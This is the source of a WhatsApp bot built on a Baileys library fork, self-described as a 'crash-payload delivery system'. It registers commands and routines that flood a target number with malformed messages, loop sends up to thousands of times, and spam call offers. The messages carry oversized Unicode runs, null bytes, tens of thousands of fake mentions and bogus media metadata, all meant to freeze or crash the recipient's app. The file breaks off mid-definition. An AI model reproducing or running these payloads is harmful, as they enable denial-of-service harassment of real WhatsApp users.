// bot.js — standalone crash-payload delivery system for @lordmega/baileys.
//
// Structure mirrors cypher-md (src/bot.js):
//   - commands registry {name: {handler, aliases, args, groupAdminRequired}} + aliasMap + executeCommand
//   - startBot() builds the socket with fetchLatestWaWebVersion() + silent pino logger
//   - connection.update handles close reasons (428/408/503/515/loggedOut/connectionReplaced)
//     with exponential-backoff scheduleReconnect
//   - messages.upsert uses normalizeMessageContent + per-session dedup + type==='notify' gate
//   - module exports { startBot, connections, sessions, startTime, isConnecting }
//
// Crash-payload specifics preserved:
//   - session from ./auth_info (created by pair.js)
//   - scans THIS folder for every *.js and dynamically imports default exports into `payloads`
//   - embeds a ROUTINES registry (every functional script in the folder) via `!run`
//   - obfuscated UMD payloads (CallCrash.js, IosInvisible.js) load through a vm sandbox
//   - commands: !ping | !list | !send | !calltest | !callspam | !run | !help
//
// NOTE: package.json sets "type": "commonjs", so either rename this file to
// bot.mjs (like index.mjs) or set "type": "module" to run it.

import {
  makeWASocket,
  useMultiFileAuthState,
  fetchLatestWaWebVersion,
  generateWAMessageFromContent,
  generateWAMessage,
  prepareWAMessageMedia,
  normalizeMessageContent,
  areJidsSameUser,
  proto,
  Browsers,
  DisconnectReason,
} from '@lordmega/baileys'
import crypto from 'node:crypto'
import fs from 'node:fs'
import path from 'node:path'
import vm from 'node:vm'
import { createRequire } from 'node:module'
import { pathToFileURL } from 'node:url'
import pino from 'pino'
import { Boom } from '@hapi/boom'
import { fileURLToPath } from 'node:url'
import { useAuthState } from './storage.js'

process.on('unhandledRejection', (err) => {
  if (err?.message) console.error('[FATAL]', err.message)
})

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
const randJids = (n, low = 500000, high = 9000000) =>
  Array.from({ length: n }, () => `1${Math.floor(Math.random() * high) + low}@s.whatsapp.net`)

// ---------------------------------------------------------------------------
// JID helpers (mirror cypher-md: normalizeJid + resolveJid + lidToPhone)
// ---------------------------------------------------------------------------

// strip to bare digits: "2348012345678:0@s.whatsapp.net" -> "2348012345678"
const normalizeJid = (jid) => {
  if (!jid) return ''
  return jid.split(':')[0].split('@')[0].split('.')[0].replace(/[^0-9]/g, '')
}

// cached LID -> phone (and reverse) resolution map, shared across sessions
const lidToPhone = new Map()

// Resolve a JID to a usable destination:
//  - full jids (@s.whatsapp.net / @g.us / @broadcast) pass through
//  - @lid is resolved to the phone JID via cache, then conn.findUserId
//  - bare numbers are normalized to phone jids
const resolveJid = async (jid, conn) => {
  if (!jid) return jid
  if (jid.endsWith('@s.whatsapp.net') || jid.endsWith('@g.us') || jid.endsWith('@broadcast')) return jid
  if (jid.endsWith('@lid')) {
    const norm = normalizeJid(jid)
    if (lidToPhone.has(norm)) return lidToPhone.get(norm) + '@s.whatsapp.net'
    if (conn) {
      try {
        const ids = await conn.findUserId(jid)
        if (ids?.phoneNumber) {
          const phoneNorm = normalizeJid(ids.phoneNumber)
          lidToPhone.set(norm, phoneNorm)
          lidToPhone.set(phoneNorm, norm)
          return ids.phoneNumber
        }
      } catch (_) {}
    }
    return jid
  }
  return normalizeJid(jid) ? `${normalizeJid(jid)}@s.whatsapp.net` : jid
}

// safe full-jid comparison (handles LID vs phone digit strings)
const sameUser = (a, b) => {
  if (!a || !b) return false
  return areJidsSameUser(a, b) || normalizeJid(a) === normalizeJid(b)
}

// protobuf wire size of a generated WAMessage, with JSON fallback
const wireSize = (msg) => {
  try {
    const info = proto.WebMessageInfo.fromObject({
      key: msg.key,
      message: msg.message,
      messageTimestamp: Math.floor(Date.now() / 1000),
    })
    return proto.WebMessageInfo.encode(info).length
  } catch {
    try {
      return Buffer.byteLength(JSON.stringify({ key: msg.key, message: msg.message }))
    } catch {
      return -1
    }
  }
}

// manual call offer via a raw 'call' node
async function sendRawCallNode(target) {
  const devices = await sock
    .getUSyncDevices([target], false, false)
    .then((ds) => ds.map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`))
  await sock.assertSessions(devices)
  const { nodes: destinations } = await sock.createParticipantNodes(
    devices,
    { conversation: 'y' },
    { count: '0' }
  )
  const callNode = {
    tag: 'call',
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: 'offer',
      attrs: {
        'call-id': crypto.randomBytes(16).toString('hex').toUpperCase(),
        'call-creator': sock.user.id,
      },
      content: [
        { tag: 'audio', attrs: { enc: 'opus', rate: '16000' } },
        { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
        { tag: 'video', attrs: { orientation: '0', screen_width: '1920', screen_height: '1080', device_orientation: '0', enc: 'vp8', dec: 'vp8' } },
        { tag: 'net', attrs: { medium: '3' } },
        { tag: 'capability', attrs: { ver: '1' }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: 'encopt', attrs: { keygen: '2' } },
        { tag: 'destination', attrs: {}, content: destinations },
      ],
    }],
  }
  await sock.sendNode(callNode)
}

// one call offer via native offerCall, falling back to the raw node builder
async function sendCallOffer(target, count = 1) {
  const offers = Math.max(1, count)
  for (let i = 0; i < offers; i++) {
    if (typeof sock.offerCall === 'function') {
      await sock.offerCall(target, { isVideo: false })
    } else {
      await sendRawCallNode(target)
    }
    if (i < offers - 1) await sleep(1500)
  }
  return offers
}

// ---------------------------------------------------------------------------
// Global state (mirrors cypher-md: connections/sessions/startTime + reconnect maps)
// ---------------------------------------------------------------------------
const connections = new Map()           // sessionId -> socket instance
const sessions = new Map()              // sessionId -> per-session state (EXPORTED)
const startTime = Date.now()

// ── Sent-message delivery tracker ──
// key: msgId -> { type, name, target, sentAt, status, updatedAt }
const sentTracker = new Map()
const sentStatusLabels = {
  0: 'PENDING', 1: 'SERVER_ACK', 2: 'DELIVERED', 3: 'READ', 4: 'PLAYED',
  6: 'FAILED', 7: 'FATAL', 8: 'DELETED',
}

function trackSentMessage(msgId, meta) {
  if (!msgId) return
  sentTracker.set(msgId, {
    ...meta,
    sentAt: new Date().toISOString(),
    status: 0,
    statusLabel: 'PENDING',
    updatedAt: new Date().toISOString(),
  })
}

function reportSentStatus(msgId) {
  const entry = sentTracker.get(msgId)
  if (!entry) return
  console.log(
    `[SEND-STATUS] ${entry.type} "${entry.name}" -> ${entry.target} ` +
    `msgId=${msgId} status=${entry.statusLabel} ` +
    `(sent ${entry.sentAt}, updated ${entry.updatedAt})`
  )
}

// Called from conn.ev.on('messages.update') — logs real delivery state.
function onMessagesUpdate(updates) {
  for (const u of updates) {
    const id = u.key?.id
    const entry = sentTracker.get(id)
    if (!entry) continue
    if (typeof u.status === 'number') {
      entry.status = u.status
      entry.statusLabel = sentStatusLabels[u.status] || `STATUS_${u.status}`
    }
    entry.updatedAt = new Date().toISOString()
    reportSentStatus(id)
    if ([2, 3, 4, 6, 7, 8].includes(entry.status)) {
      sentTracker.delete(id) // terminal state — stop tracking
    }
  }
}
const reconnectAttempts = new Map()
const reconnectTimers = new Map()
const isConnecting = new Map()
const consecutive428 = new Map()
const lastStream515At = new Map()
const lastConnectedAt = new Map()

const RECONNECT_MAX_ATTEMPTS = 5
const RECONNECT_BASE_DELAY = 10
const RECONNECT_MAX_DELAY = 300
const RECONNECT_COOLDOWN_AFTER = 60000

function createSessionState() {
  return {
    processedMessages: new Set(),
    totalCommandsAttempted: 0,
    totalCommandsSucceeded: 0,
  }
}

// Global socket reference — assigned by startBot(); used by embedded routines.
let sock = null

// ---------------------------------------------------------------------------
// Payload discovery — dynamic import of every *.js in the script folder.
// Excludes bot.js itself, pair.js and anything under node_modules.
// ---------------------------------------------------------------------------
const payloads = {}
const routines = {}

const scanDir = path.dirname(fileURLToPath(import.meta.url))
let ownNames = ['bot.js', 'bot.mjs', 'bot_test.mjs', 'pair.js', 'server.js', 'storage.js']

try {
  const entries = fs.readdirSync(scanDir, { withFileTypes: true })
  const jsFiles = entries
    .filter((e) => e.isFile())
    .filter((e) => e.name.endsWith('.js'))
    .filter((e) => !e.name.includes('node_modules'))
    .filter((e) => !ownNames.some((n) => e.name.toLowerCase() === n))

  for (const file of jsFiles) {
    const key = file.name.replace(/\.js$/, '')
    try {
      const mod = await import(pathToFileURL(path.join(scanDir, file.name)).href)
      const def = mod?.default ?? mod
      if (def && typeof def === 'object' && Object.keys(def).length) {
        payloads[key] = def
        console.log(`[load] "${key}" -> payload object`)
      } else if (typeof def === 'function') {
        routines[key] = def
        console.log(`[load] "${key}" -> default function registered`)
      } else {
        console.warn(`[load] "${key}" -> no usable default export (skipped)`)
      }
    } catch (err) {
      console.warn(`[load] "${key}" failed (${err.message}) — source is not a clean module, using built-in routine`)
    }
  }
} catch (err) {
  console.warn(`[load] could not scan folder: ${err.message}`)
}

// Bonus: pull in payloads.mjs (explicit named export) if present.
try {
  const { payloads: extra } = await import(pathToFileURL(path.join(scanDir, 'payloads.mjs')).href)
  if (extra) {
    for (const [k, v] of Object.entries(extra)) {
      payloads[k.replace(/\.js$/, '')] = v
    }
    console.log(`[load] merged ${Object.keys(extra).length} payload(s) from payloads.mjs`)
  }
} catch { /* optional */ }

// ---------------------------------------------------------------------------
// Optional detection filter (log-only, never blocks or auto-replies).
// ---------------------------------------------------------------------------
let scoreMessage = null
try {
  const detect = await import('./detect.mjs')
  scoreMessage = detect.scoreMessage || null
  console.log('[detect] scoreMessage() loaded from detect.mjs')
} catch (err) {
  console.warn(`[detect] detect.mjs not found / no scoreMessage export (${err.message})`)
}

// ---------------------------------------------------------------------------
// ROUTINES — adapted, self-contained copies of every functional script in the
// folder. Each has signature (sock, target, opts). Registered below so that
// `!run <file> <target>` invokes the matching one.
// ---------------------------------------------------------------------------

// blank lagi.js  -> blankLagi
async function blankLagi(target) {
  const extended = {
    extendedTextMessage: {
      text: 'Makan Blank Bang' + 'ꦾ'.repeat(6000),
      contextInfo: {
        mentionedJid: ['0@s.whatsapp.net', ...randJids(700)],
        stanzaId: sock.generateMessageTag(),
        participant: '0@s.whatsapp.net',
        quotedMessage: { conversation: 'ꦾ'.repeat(60000) },
      },
      nativeFlowMessage: { messageParamsJson: '{'.repeat(10000) },
    },
  }
  await sock.relayMessage(target, extended, { messageId: sock.generateMessageTag() })

  const newsletter = {
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: '1@newsletter',
          newsletterName: 'Snith Point',
          caption: 'ꦾ'.repeat(3000),
          inviteExpiration: Date.now() + 9999999999,
        },
      },
    },
    nativeFlowMessage: { messageParamsJson: '{'.repeat(10000) },
    contextInfo: {
      remoteJid: target,
      participant: target,
      stanzaId: sock.generateMessageTag(),
      quotedMessage: { conversation: 'ꦾ'.repeat(60000) },
    },
  }
  await sock.relayMessage(target, newsletter, { messageId: sock.generateMessageTag() })
}

// blankNew.js -> BlackBlankTotal (album + 666 status mentions)
async function BlackBlankTotal(target, mention = false, opts = {}) {
  const album = await generateWAMessageFromContent(target, {
    albumMessage: { expectedImageCount: 666, expectedVideoCount: 0 },
  }, { userJid: target })
  await sock.relayMessage(target, album.message, { messageId: album.key.id })

  const loops = opts.count ?? 666
  for (let i = 0; i < loops; i++) {
    const msg = await generateWAMessageFromContent(target, {
      interactiveMessage: {
        body: { text: 'Black Bull Bro' },
        contextInfo: {
          mentionedJid: ['13135550002@s.whatsapp.net', ...randJids(30000)],
          participant: '0@s.whatsapp.net',
          remoteJid: 'status@broadcast',
          forwardedNewsletterMessageInfo: {
            newsletterName: 'Ughhhh',
            newsletterJid: '0@newsletter',
            serverMessageId: 1,
          },
        },
      },
    }, {})
    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta', attrs: {}, content: [{
          tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: target }, content: undefined }],
        }],
      }],
    })
    if (mention) {
      await sock.relayMessage(target, {
        statusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } },
      }, { additionalNodes: [{ tag: 'meta', attrs: { is_status_mention: 'true' }, content: undefined }] })
    }
  }
  return loops
}

// blanknotif.js -> CombinedMessages
async function CombinedMessages(target) {
  const ButtonsPush = [{
    name: 'single_select',
    buttonParamsJson: JSON.stringify({ title: 'ោ៝'.repeat(2000), sections: [{ title: '\u0000', rows: [] }] }),
  }]
  for (let i = 0; i < 100; i++) ButtonsPush.push({ name: 'galaxy_message', buttonParamsJson: '\u0000'.repeat(1045000) })

  const blankSpamMessage = await generateWAMessageFromContent(target, {
    viewOnceMessage: { message: {
      interactiveMessage: {
        header: {
          title: '</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊', hasMediaAttachment: true,
          imageMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true',
            mimetype: 'image/jpeg',
            fileSha256: 'QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=',
            fileLength: '9999999999999', height: 9999, width: 9999,
            mediaKey: 'exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=',
            fileEncSha256: 'D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=',
            directPath: '/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc',
            mediaKeyTimestamp: '1755254367', jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAA',
          },
        },
        body: { text: 'ꦽ'.repeat(25000) + 'ោ៝'.repeat(20000) },
        nativeFlowMessage: { messageParamsJson: '{'.repeat(10000), buttons: ButtonsPush },
        contextInfo: {
          forwardingScore: 9999, isForwarded: true, participant: '0@s.whatsapp.net',
          remoteJid: 'status@broadcast', mentionedJid: ['131338822@s.whatsapp.net', ...randJids(1900)],
          ephemeralSettingTimestamp: 9741, entryPointConversionSource: 'WhatsApp.com',
          entryPointConversionApp: 'WhatsApp',
          disappearingMode: { initiator: 'INITIATED_BY_OTHER', trigger: 'ACCOUNT_SETTING' },
        },
      },
    } },
  }, {})
  await sock.relayMessage(target, blankSpamMessage.message, {
    messageId: blankSpamMessage.key.id, participant: { jid: target }, userJid: target,
  })

  const systemMessage = {
    viewOnceMessage: { message: {
      messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
      interactiveMessage: {
        header: { title: '</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊' + 'ꦽ'.repeat(100000) + 'ꦾ'.repeat(10000) },
        body: { text: '</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊' + '\u200B'.repeat(5000) },
        footer: { text: '</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊' + '\u200B'.repeat(5000) },
        nativeFlowMessage: {
          messageParamsJson: '{}'.repeat(10000),
          buttons: [
            { name: 'single_select', buttonParamsJson: `{"title":"${'𑲭𑲭'.repeat(10000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}` },
            { name: 'galaxy_message', buttonParamsJson: JSON.stringify({ icon: '\u200B'.repeat(5000), flow_cta: 'ꦽ'.repeat(10000), flow_message_version: '3' }) },
            { name: 'cta_url', buttonParamsJson: JSON.stringify({ display_text: `null ${'ꦽ'.repeat(19999)}`, url: 'https://t.me/fdynzaie', merchant_url: 'https://t.me/fdynzaie' }) },
            { name: 'galaxy_message', buttonParamsJson: JSON.stringify({ flow_message_version: '3', flow_token: 'unused', flow_id: '1775342589999842', flow_cta: '</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊', flow_action: 'navigate', flow_action_payload: { screen: 'AWARD_CLAIM', data: { error_types: [], campaigns: [], categories: [{ id: 'category_1', title: 'Unicam' }] } }, flow_metadata: { flow_json_version: 1000, data_api_protocol: 'I am dying and bleeding of my past', data_api_version: 9999999, flow_name: '</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊', categories: [] }, icon: 'REVIEW', has_multiple_buttons: true }) },
          ],
        },
      },
    } },
  }
  const msg = await generateWAMessageFromContent(target, systemMessage, { userJid: sock?.user?.id })
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id })

  const msg1 = {
    viewOnceMessage: { message: {
      newsletterAdminInviteMessage: {
        newsletterJid: '1@newsletter',
        newsletterName: '</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊' + 'ꦽ'.repeat(500) + 'ꦾ'.repeat(8000),
        caption: 'ꦾ'.repeat(9000), inviteExpiration: Date.now() + 9999999999,
      },
    } },
    contextInfo: { remoteJid: target, participant: target, stanzaId: sock.generateMessageTag() },
  }
  const msg2 = {
    ephemeralMessage: { message: {
      interactiveMessage: {
        header: { title: 'ꦾ'.repeat(1000), locationMessage: { degreesLatitude: 0, degreesLongitude: 0 }, hasMediaAttachment: true },
        body: { text: '</⃟TΣXXΛS :: 404.Σ𝖃Σꦾ⃟🕊' + 'ꦽ'.repeat(2500) + '🌟'.repeat(2000) },
        nativeFlowMessage: {
          messageParamsJson: '{'.repeat(10000),
          buttons: [
            { name: 'single_select', buttonParamsJson: JSON.stringify({ status: true }) },
            { name: 'call_permission_request', buttonParamsJson: JSON.stringify({ status: true }) },
          ],
        },
      },
    } },
  }
  await Promise.all([sock.relayMessage(target, msg1), sock.relayMessage(target, msg2)])
  return 'combined messages sent'
}

// blankui.js -> StickerPackFreeze
async function StickerPackFreeze(target, opts = {}) {
  const stickerPack = await generateWAMessageFromContent(target, {
    extendedTextMessage: { message: {
      stickerPackMessage: {
        stickerPackId: '642f1c7a-094d-4ea7-82aa-d283952a4322',
        name: 'https://Wa.me/stickerpack/Xyraa4Sx', publisher: 'Xyraaa4Sx',
        stickers: [
          { fileName: 'hH9-mjYyzRiKyN89WuVcxbgidYdQeGjBxQeUfz3NVQ4=.webp', isAnimated: true, emojis: ['💐'], accessibilityLabel: 'ꦾ'.repeat(1222), isLottie: false, mimetype: 'image/webp' },
          { fileName: 'jpxNv2Sd1s6fL5-HnkMrNQY3XbN0YLO4th8uwwgl4dA=.webp', isAnimated: true, emojis: ['💐'], accessibilityLabel: 'ꦾ'.repeat(1222), isLottie: false, mimetype: 'image/webp' },
          { fileName: 'RrPMKWCtHlOwjp97mAglUYPIaJWYtVPmndIVDLDX96g=.webp', isAnimated: true, emojis: ['💐'], accessibilityLabel: 'ꦾ'.repeat(1222), isLottie: false, mimetype: 'image/webp' },
        ],
        fileLength: 959168, fileSha256: 'R45kqbx/nwvhGMMqLkD49f1ggQ9anc07PNnmx6TvoNE=',
        fileEncSha256: 'iiZJfuiGEdzzsXqOM3gzdFVgpz1MyY0GPMP7UAYGnZI=',
        mediaKey: 'GJAqSOkifR6DPqViXuBJ8P3+/NkzhsWH6EEuYTySJ4s=',
        directPath: '/v/t62.15575-24/542959707_546680258506540_609965180471151393_n.enc',
        mediaKeyTimestamp: 1756908899, trayIconFileName: '642f1c7a-094d-4ea7-82aa-d283952a4322.png',
        thumbnailDirectPath: '/v/t62.15575-24/542690545_4192380777713097_4091855665882100743_n.enc',
        thumbnailSha256: 'yXthaTViH0AaN5zl4KC6nd/MJcIW2TdUPMDeeHsNdSg=',
        thumbnailEncSha256: 'UDvv/9QVJLPYZ1VFrAmiD1CEDVZYIHmmxfg/fx8HN6Y=',
        thumbnailHeight: 252, thumbnailWidth: 252,
        imageDataHash: 'ZDNjZWEwMjk3MGY3MzA5MGE0MzU3YzIwZDI1YmQyYjZlNWNjMGYxZjAwODUzNzYxMTUxN2NiYmI3NDExYTdjZQ==',
        stickerPackSize: 961398, stickerPackOrigin: 'USER_CREATED',
      },
      contextInfo: {
        isForwarded: true, forwardingScore: 9999,
        businessMessageForwardInfo: {
          businessOwnerJid: '6288905301692@s.whatsapp.net', participant: '0@s.whatsapp.net',
          remoteJid: 'status@broadcast', mentionedJid: [target, '0@s.whatsapp.net', ...randJids(30000)],
        },
        quotedMessage: {
          interactiveResponseMessage: {
            body: { text: 'Xyraa4Sx Is Here?💐', format: 'DEFAULT' },
            nativeFlowResponseMessage: {
              buttons: [{ name: 'payment_method', buttonParamsJson: JSON.stringify({ reference_id: null, payment_method: '\u0010'.repeat(0x2710), payment_timestamp: null, share_payment_status: true }) }],
              messageParamsJson: '{}',
            },
          },
        },
      },
    } },
  })

  const loops = opts.count ?? 2000
  for (let i = 0; i < loops; i++) {
    await sock.relayMessage(target, stickerPack.message, {
      additionalNodes: [{ tag: 'biz', attrs: { native_flow_name: 'payment_method' } }],
      messageId: stickerPack.key.id, participant: { jid: target }, userJid: target,
    })
    await sleep(opts.delay ?? 1000)
  }
  return loops
}

// blankXdelay.js -> AudioXDellay
async function AudioXDellay(target) {
  const msg = {
    viewOnceMessage: { message: {
      videoMessage: {
        caption: '꧔꧈'.repeat(600), mimetype: 'video/mp4', fileName: '𝐀𝐦𝐞𝐥𝐢𝐚𝐚𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝',
        fileLength: '9999999999', seconds: 999999,
        mediaKey: 'v/J9vWyG92CnR0fqagJ7GBxQzmDG3+cV+DBL1yyECBI=',
        contextInfo: { forwardingScore: 9999, isForwarded: true },
      },
    } },
    audioMessage: {
      mimetype: 'audio/ogg; codecs=opus', ptt: true, seconds: 9999,
      fileName: '𝐀𝐦𝐞𝐥𝐢𝐚 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝' + '꧔꧈'.repeat(500),
      fileLength: '9999999999', mediaKey: 'n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=',
      contextInfo: { forwardingScore: 9999, isForwarded: true, mentionedJid: randJids(1) },
    },
  }
  await sock.sendMessage(target, msg)
}

// BlankXFrezeGrup.js -> FrezeXblank (gif/video status freeze)
async function FrezeXblank(target, opts = {}) {
  let imagePayload = null
  try {
    const vid = await prepareWAMessageMedia({
      video: { url: 'https://files.catbox.moe/74v4yo.mp4', gifPlayback: true },
    }, { upload: sock.waUploadToServer, mediaType: 'video' })
    imagePayload = { ...vid }
  } catch { /* media upload may fail offline — proceed without media */ }

  const loops = opts.count ?? 100
  for (let i = 0; i < loops; i++) {
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [target], isForwarded: true, forwardingScore: 999,
          forwardedNewsletterMessageInfo: { newsletterJid: '120363399013145023@newsletter', newsletterName: 'https://amelia.overload', serverMessageId: 1 },
        },
        header: { title: '', ...(imagePayload || {}), hasMediaAttachment: !!imagePayload },
        body: { text: 'HAII SAVE AMELIA' },
        footer: { text: '' },
        nativeFlowMessage: {
          buttons: [
            { name: 'single_select', buttonParamsJson: `{"title":"${'ꦾ'.repeat(10000)}","sections":[{"title":"Crash","rows":[]}]}` },
            { name: 'galaxy_message', buttonParamsJson: JSON.stringify({ screen_1_TextInput_0: 'radio - buttons' + '\0'.repeat(10000), screen_0_Dropdown_1: 'Null', flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s.' }), version: 3 },
          ],
        },
      },
    }), { userJid: target })
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
  return loops
}

// callWithNode (1).js -> callWithNode (raw node call spam, 5s spacing)
async function callWithNode(target, opts = {}) {
  const loops = opts.count ?? 1
  for (let i = 0; i < loops; i++) {
    await sendRawCallNode(target)
    await sleep(5000)
  }
  return loops
}

// Call-invis.js -> VideoCallCrashNoClick
async function VideoCallCrashNoClick(target) {
  const callSpamPayload = {
    call: {
      callKey: Buffer.from(Array.from({ length: 1000 }, () => Math.floor(Math.random() * 256))).toString('base64'),
      callCreator: target, callType: 1, isVideo: true, timestamp: Date.now(), isIncoming: true,
      callId: `crash_spam_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      participants: [target], callDuration: -1, maxParticipants: 65535,
      videoCodec: 'CRASH_CODEC_' + 'A'.repeat(1000),
      audioCodec: 'CRASH_AUDIO_' + 'B'.repeat(1000), callState: 999,
      contextInfo: {
        remoteJid: target, mentionedJid: [target], forwardingScore: 2147483647,
        conversionSource: 'CALL_SPAM_CRASH',
        conversionData: Array.from({ length: 100 }, (_, i) => ({ timestamp: Date.now() + i, data: `CALL_SPAM_EXPLOIT_${i}`, method: 'RACE_CONDITION', effect: 'IMMEDIATE_CRASH_NO_CLICK' })),
        expiryTimestamp: 0, ephemeralExpiration: 0, ephemeralSettingTimestamp: 0xFFFFFFFF,
        externalAdReply: { title: 'DimxLoy berburu janda', body: 'Auto-answer will crash WhatsApp', mediaType: 3, thumbnailUrl: 'whatsapp://call/autoanswer/crash', sourceUrl: 'whatsapp://call/trigger/immediate', sourceType: 'CALL_CRASH_EXPLOIT', autoplay: true, loop: true, autoAnswer: true },
      },
    },
  }
  const notificationBomb = {
    conversation: '🔔 CALL NOTIFICATION CRASH EXPLOIT\n\nExploit: NotificationService::QueueOverflow\nEffect: SystemUI crash\n\nCrash ID: CALL_NOTIF_BOMB_' + Date.now(),
    contextInfo: { mentionedJid: [target], forwardingScore: 999999, conversionSource: 'NOTIFICATION_CRASH', conversionData: [{ timestamp: Date.now(), data: 'NOTIFICATION_QUEUE_OVERFLOW', effect: 'SYSTEMUI_CRASH', requiresRestart: true }] },
  }
  const ringtoneExploit = {
    extendedTextMessage: {
      text: '🔊 RINGTONE LOOP CRASH\n\nPayload: ' + Array.from({ length: 1000 }, () => String.fromCharCode(0x0007)).join(''),
      contextInfo: { mentionedJid: [target], forwardingScore: 2147483647, conversionSource: 'RINGTONE_CRASH', conversionData: [{ timestamp: Date.now(), data: 'INFINITE_RINGTONE_LOOP', effect: 'AUDIO_ENGINE_CRASH', recovery: 'FORCE_STOP_REQUIRED' }] },
    },
  }

  for (let i = 0; i < 20; i++) {
    setTimeout(async () => {
      try {
        const uniqueCall = { ...callSpamPayload, call: { ...callSpamPayload.call, callId: `crash_${Date.now()}_${i}_${Math.random().toString(36).substr(2, 5)}`, timestamp: Date.now() + i } }
        await sock.sendMessage(target, uniqueCall)
      } catch { /* per-call failures ignored */ }
    }, i * 50)
  }
  await sock.sendMessage(target, notificationBomb)
  await sock.sendMessage(target, ringtoneExploit)

  setTimeout(async () => {
    const autoAnswerExploit = {
      viewOnceMessage: { message: {
        callLogMessage: {
          callOutcome: 1, durationSecs: 999999, isVideo: true, participants: [target],
          callId: 'auto_answer_crash_' + Date.now(), callTimestamp: Date.now(),
          callAnswerData: { answerTimestamp: 0, answerDuration: -1, answerCodec: 'INVALID_' + 'C'.repeat(10000), answerQuality: 999, answerResolution: '9999x9999' },
          contextInfo: { mentionedJid: [target], conversionSource: 'AUTO_ANSWER_CRASH', conversionData: [{ timestamp: Date.now(), data: 'CALL_AUTO_ANSWER_EXPLOIT', vulnerability: 'CALL_HANDLER_RACE_CONDITION', effect: 'IMMEDIATE_CRASH_ON_RECEIVE' }] },
        },
      } },
    }
    await sock.sendMessage(target, autoAnswerExploit)
  }, 1000)
  return 'call crash payloads deployed'
}

// delay apk.js -> HardInvis (audio+video status freeze, 1500 rounds)
async function HardInvis(target, opts = {}) {
  const audioMessage = {
    url: 'https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true',
    mimetype: 'audio/mpeg', fileSha256: 'ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=',
    fileLength: 99999999999999, seconds: 99999999999999, ptt: true,
    mediaKey: '+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=',
    fileEncSha256: 'iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=',
    directPath: '/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc',
    mediaKeyTimestamp: 99999999999999,
    contextInfo: { mentionedJid: ['@s.whatsapp.net', ...randJids(1900)], isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363375427625764@newsletter', serverMessageId: 1, newsletterName: 'Ambatukam x Proto' } },
    waveform: 'AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==',
  }
  const videoMessage = {
    url: 'https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true',
    mimetype: 'video/mp4', fileSha256: 'c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=',
    fileLength: 289511, seconds: 15,
    mediaKey: 'IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=',
    caption: 'ោ៝'.repeat(4000), height: 640, width: 640,
    fileEncSha256: 'BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=',
    directPath: '/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc',
    mediaKeyTimestamp: 1743848703,
    contextInfo: { isSampled: true, mentionedJid: ['13135550002@s.whatsapp.net', ...randJids(1900)] },
    forwardedNewsletterMessageInfo: { newsletterJid: '120363321780343299@newsletter', serverMessageId: 1, newsletterName: '⏤͟͟͞͞𝑰𝒕𝒔𝑴𝒆 𝐾𝑖𝑝𝑜𝑝' },
    streamingSidecar: 'cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=',
    thumbnailDirectPath: '/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc',
